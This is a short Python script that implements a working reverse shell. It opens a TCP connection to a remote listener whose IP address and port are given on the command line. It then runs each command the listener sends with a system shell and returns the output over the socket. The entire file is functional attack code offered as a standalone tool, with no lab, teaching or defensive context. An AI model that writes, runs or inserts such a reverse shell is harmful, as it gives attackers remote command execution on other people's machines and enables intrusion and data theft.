#!/usr/bin/env python3
"""
reverse_shell.py
Author: amm2825
Description: A simple reverse shell that connects to a remote listener,
             providing an interactive shell session.
"""

import socket
import subprocess
import sys

def reverse_shell(server_ip, server_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, int(server_port)))
        s.sendall(b"[+] Reverse shell connected.\n")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

    while True:
        # Receive a command from the listener.
        data = s.recv(1024)
        if not data:
            break
        command = data.decode().strip()
        if command.lower() == "exit":
            break
        try:
            # Execute the command and capture output.
            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            output, error = proc.communicate()
            response = output + error
            if not response:
                response = b"[!] No output.\n"
        except Exception as ex:
            response = f"Error executing command: {ex}\n".encode()
        # Send the response back to the listener.
        s.sendall(response)
    s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <server_ip> <server_port>")
        sys.exit(0)
    reverse_shell(sys.argv[1], sys.argv[2])
